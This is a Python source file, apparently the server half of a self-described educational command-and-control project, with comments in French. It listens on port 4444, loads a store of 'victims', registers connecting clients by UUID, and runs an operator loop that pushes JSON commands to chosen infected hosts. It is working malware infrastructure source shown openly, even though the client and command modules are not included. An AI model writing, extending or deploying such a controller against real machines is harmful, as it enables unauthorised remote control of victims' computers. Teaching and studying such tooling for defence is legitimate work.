"""
server/main.py
--------------

Point d'entrée du serveur pédagogique.
"""

import socket
import threading
import json

from handler import handle_client
from storage import load_victims
from operator import operator_loop


HOST = "0.0.0.0"
PORT = 4444

# uuid -> socket
CLIENTS = {}
CLIENTS_LOCK = threading.Lock()


def register_client_uuid(uuid: str, conn):
    with CLIENTS_LOCK:
        CLIENTS[uuid] = conn
    print(f"[INFO] Client enregistré : {uuid}")


def send_to_client(uuid: str, message: dict):
    with CLIENTS_LOCK:
        conn = CLIENTS.get(uuid)

    if not conn:
        print(f"[ERROR] Aucun client connecté pour {uuid}")
        return

    try:
        data = json.dumps(message) + "\n"
        conn.sendall(data.encode())
        print(f"[INFO] Message envoyé à {uuid}")
    except Exception as e:
        print(f"[ERROR] Impossible d'envoyer au client {uuid}: {e}")


def client_thread(conn, addr):
    try:
        handle_client(conn, addr, register_client_uuid)
    except Exception as e:
        print(f"[ERROR] Problème avec le client {addr}: {e}")
    finally:
        conn.close()
        print(f"[INFO] Connexion fermée pour {addr}")


def start_server():
    print("[INFO] Chargement des victimes existantes...")
    victims = load_victims()
    print(f"[INFO] Victimes connues : {list(victims.keys())}")

    print(f"[INFO] Démarrage du serveur sur {HOST}:{PORT}")

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen()

    print("[INFO] Serveur en écoute...")

    threading.Thread(
        target=operator_loop,
        args=(send_to_client,),
        daemon=True
    ).start()

    while True:
        conn, addr = server_socket.accept()
        print(f"[INFO] Nouvelle connexion depuis {addr}")

        t = threading.Thread(target=client_thread, args=(conn, addr))
        t.daemon = True
        t.start()


if __name__ == "__main__":
    start_server()
